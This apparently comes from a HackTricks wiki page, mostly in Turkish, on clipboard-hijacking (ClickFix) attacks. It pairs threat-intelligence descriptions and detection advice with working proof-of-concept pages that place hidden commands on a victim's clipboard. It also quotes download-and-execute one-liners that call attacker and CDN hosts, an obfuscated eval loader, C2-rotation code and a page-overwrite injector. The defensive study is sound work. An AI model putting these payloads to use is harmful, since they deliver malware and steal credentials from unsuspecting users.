# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kendiniz kopyalamadığınız hiçbir şeyi yapıştırmayın." – eski ama hâlâ geçerli bir tavsiye

## Genel Bakış

Clipboard hijacking – diğer adıyla *pastejacking* – kullanıcıların komutları incelemeden rutin olarak kopyala-yapıştır yapma alışkanlığını suistimal eder. Kötü niyetli bir web sayfası (veya Electron veya Desktop uygulaması gibi herhangi bir JavaScript-çalıştırabilen bağlam) programatik olarak saldırgan kontrollü metni sistem clipboard'ına yerleştirir. Mağdurlar genellikle özenle hazırlanmış social-engineering talimatlarla **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) tuşlarına basmaya veya bir terminal açıp clipboard içeriğini *paste* etmeye teşvik edilir; böylece anında rastgele komutlar yürütülür.

Çünkü **hiçbir dosya indirilmez ve hiçbir attachment açılmaz**, teknik attachments, macros veya direct command execution'ı izleyen çoğu e-posta ve web içeriği güvenlik kontrolünü atlar. Bu yüzden saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi commodity malware ailelerini dağıtan phishing kampanyalarında popülerdir.

## Forced copy buttons and hidden payloads (macOS one-liners)

Bazı macOS infostealer'lar installer sitelerini (örn. Homebrew) klonlayıp kullanıcıların sadece görünen metni seçmesini engellemek için **“Copy” düğmesinin kullanılmasını zorlar**. Clipboard girdisi beklenen installer komutunu ve eklenmiş bir Base64 payload'ı içerir (örn. `...; echo <b64> | base64 -d | sh`), böylece tek bir paste her ikisini de çalıştırır ve UI ekstra aşamayı gizler.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake Akışı

1. Kullanıcı typosquatted veya ele geçirilmiş bir siteyi (ör. `docusign.sa[.]com`) ziyaret eder.
2. Enjekte edilen **ClearFake** JavaScript'i, clipboard'a Base64 ile kodlanmış bir PowerShell tek satır komutunu sessizce depolayan `unsecuredCopyToClipboard()` yardımcı fonksiyonunu çağırır.
3. HTML talimatları kurbana şunu söyler: *“**Win + R** tuşlarına basın, komutu yapıştırın ve sorunu çözmek için Enter'a basın.”*
4. `powershell.exe` çalıştırılır, meşru bir çalıştırılabilir dosya ile kötü amaçlı bir DLL içeren bir arşiv indirir (classic DLL sideloading).
5. Yükleyici ek aşamaları deşifre eder, shellcode enjekte eder ve kalıcılık kurar (ör. scheduled task) – nihayetinde NetSupport RAT / Latrodectus / Lumma Stealer'ı çalıştırır.

### NetSupport RAT Zincir Örneği
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart) dizininde `msvcp140.dll`'yi arar.
* Kötü amaçlı DLL, API'leri dinamik olarak **GetProcAddress** ile çözer, iki ikili dosyayı (`data_3.bin`, `data_4.bin`) **curl.exe** ile indirir, bunları rolling XOR anahtarı `"https://google.com/"` kullanarak çözer, son shellcode'u enjekte eder ve **client32.exe** (NetSupport RAT)'ı `C:\ProgramData\SecurityCheck_v1\` dizinine zip'ten çıkarır.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` dosyasını **curl.exe** ile indirir
2. JScript downloader'ı **cscript.exe** içinde çalıştırır
3. Bir MSI payload'u alır → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer MSHTA aracılığıyla
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** çağrısı, gizli bir PowerShell betiği başlatır; bu betik `PartyContinued.exe`'yi alır, `Boat.pst` (CAB) dosyasını çıkarır, `extrac32` ve dosya birleştirme ile `AutoIt3.exe`'yi yeniden oluşturur ve nihayetinde tarayıcı kimlik bilgilerini `sumeriavgv.digital`'e exfiltrates eden bir `.a3x` betiği çalıştırır.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Bazı ClickFix kampanyaları dosya indirmeyi tamamen atlar ve kurbanlara WSH aracılığıyla JavaScript'i indirip çalıştıran, kalıcı hale getiren ve C2'yi günlük olarak döndüren tek satırlık bir komutu yapıştırmalarını söyler. Gözlemlenen örnek zincir:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ana özellikler
- Maskelenmiş URL, yüzeysel incelemeyi önlemek amacıyla çalışma zamanında ters çevrilir.
- JavaScript, Startup LNK (WScript/CScript) aracılığıyla kendini kalıcı hale getirir ve C2'yi mevcut güne göre seçer – hızlı alan adı döndürmeyi sağlar.

C2'leri tarihe göre döndürmek için kullanılan minimal JS fragmanı:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Bir sonraki aşamada genellikle persistence sağlayan bir loader konuşlandırılır ve bir RAT (ör. PureHVNC) çekilir; sıklıkla TLS'yi hardcoded bir sertifikaya pinler ve trafiği parçalara böler.

Detection ideas specific to this variant
- Süreç ağacı: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Başlangıç artefaktları: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` içinde WScript/CScript çağıran bir LNK, JS yolu `%TEMP%`/`%APPDATA%` altında.
- Registry/RunMRU ve komut‑satırı telemetrisi içinde `.split('').reverse().join('')` veya `eval(a.responseText)` içeren girdiler.
- Uzun komut satırları olmadan uzun script'leri beslemek için büyük stdin payload'ları ile tekrar eden `powershell -NoProfile -NonInteractive -Command -` çağrıları.
- Daha sonra LOLBins çalıştıran Scheduled Task'ler, ör. `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` gibi bir komut, updater görünümlü bir görev/yolu altında (örn. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Günlük dönen C2 hostları ve URL'ler, `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` desenine sahip.
- clipboard write olaylarını, ardından Win+R ile yapıştırma ve hemen `powershell.exe` çalıştırılmasıyla korele edin.

Blue-teams, clipboard, process-creation ve registry telemetrilerini birleştirerek pastejacking kötüye kullanımını tespit edebilir:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` Win + R komutlarının geçmişini tutar – sıra dışı Base64 / obfuscated girdilere bakın.
* Security Event ID **4688** (Process Creation) — `ParentImage` == `explorer.exe` ve `NewProcessName` { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } içinde olan kayıtlar.
* Event ID **4663** — şüpheli 4688 olayından hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` veya geçici klasörler altında oluşan dosya oluşturma olayları.
* EDR clipboard sensor'ları (varsa) – hemen ardından yeni bir PowerShell süreciyle `Clipboard Write`'i korele edin.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Son kampanyalar, kullanıcıları clipboard'larındaki OS-spesifik komutları native konsollara kopyalamaya zorlayan sahte CDN/tarayıcı doğrulama sayfalarını ("Just a moment…", IUAM-style) seri şekilde üretiyor. Bu, yürütmeyi tarayıcı sandbox'ının dışına taşır ve Windows ile macOS'ta çalışır.

Key traits of the builder-generated pages
- `navigator.userAgent` ile OS tespiti yaparak payload'ları (Windows PowerShell/CMD vs. macOS Terminal) uyarlama. Desteklenmeyen OS'ler için isteğe bağlı aldatmacalar/no-op'lar ile illüzyonu sürdürme.
- Görünür metin clipboard içeriğinden farklı olabilse de, zararsız UI eylemlerinde (checkbox/Copy) otomatik clipboard-kopyalama.
- Mobil engelleme ve adım adım talimatlar içeren bir popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- İsteğe bağlı obfuscation ve tek dosyalık injector ile ele geçirilmiş bir sitenin DOM'unu Tailwind-stilli bir doğrulama UI'si ile overwrite etme (yeni domain kaydı gerekmez).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS'ta ilk çalıştırmanın kalıcılığı
- Terminal kapandıktan sonra yürütmenin devam etmesi ve görünür izleri azaltmak için `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kullanın.

Ele geçirilmiş sitelerde yerinde sayfa ele geçirme
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style tuzaklara özgü tespit ve avlama fikirleri
- Web: Doğrulama widget'larına Clipboard API bağlayan sayfalar; görüntülenen metin ile clipboard payload arasında uyumsuzluk; `navigator.userAgent` dallanması; şüpheli bağlamlarda Tailwind + single-page replace.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` bir tarayıcı etkileşiminden hemen sonra; `%TEMP%`'den çalıştırılan batch/MSI installer'lar.
- macOS endpoint: Terminal/iTerm, tarayıcı olaylarına yakın `bash`/`curl`/`base64 -d` ile `nohup` çalıştırıyor; terminal kapandıktan sonra hayatta kalan arka plan işleri.
- Sonraki konsol süreç oluşumları ile `RunMRU` Win+R geçmişi ve clipboard yazmalarını korelasyonla ilişkilendir.

Destekleyici teknikler için ayrıca bakınız

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sitelerini ele geçirmeye devam ediyor ve mevcut lure mantığını çekmek için dış host'ları (Cloudflare Workers, GitHub/jsDelivr) zincirleyen ve hatta blockchain “etherhiding” çağrıları (ör. POST'lar Binance Smart Chain API uç noktalarına such as `bsc-testnet.drpc[.]org`) ile loader JavaScript enjekte ediyor. Son zamanlardaki overlay'ler, kullanıcıları herhangi bir şey indirmek yerine bir satırlık komutu kopyala/yapıştır yapmaları için yönlendiren sahte CAPTCHA'ları yoğun şekilde kullanıyor (T1204.004).
- İlk yürütme giderek signed script hosts/LOLBAS'a devrediliyor. Ocak 2026 zincirleri önceki `mshta` kullanımını, `WScript.exe` aracılığıyla çalıştırılan yerleşik `SyncAppvPublishingServer.vbs` ile değiştirdi; uzak içeriği almak için alias'lar/wildcard'lar içeren PowerShell-benzeri argümanlar geçirerek:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imzalıdır ve normalde App-V tarafından kullanılır; `WScript.exe` ile eşleştirildiğinde ve sıra dışı argümanlarla (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) ClearFake için yüksek sinyalli bir LOLBAS aşamasına dönüşür.
- Şubat 2026'da fake CAPTCHA payloads tekrar saf PowerShell download cradles'e kaydı. İki canlı örnek:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- İlk zincir, bellekte çalışan bir `iex(irm ...)` grabber; ikinci aşama `WinHttp.WinHttpRequest.5.1` üzerinden aşama gerçekleştirir, geçici bir `.ps1` yazar ve ardından gizli bir pencerede `-ep bypass` ile başlatır.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## Mitigations

1. Tarayıcı sertleştirmesi – clipboard yazma erişimini devre dışı bırakın (`dom.events.asyncClipboard.clipboardItem` vb.) veya kullanıcı etkileşimi gerektirin.
2. Güvenlik farkındalığı – kullanıcılara hassas komutları *yazmaları* veya önce bir metin düzenleyicisine yapıştırmaları öğretilmeli.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ile rastgele tek satırlık komutları engelleyin.
4. Ağ kontrolleri – bilinen pastejacking ve malware C2 domain'lerine giden çıkış isteklerini engelleyin.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
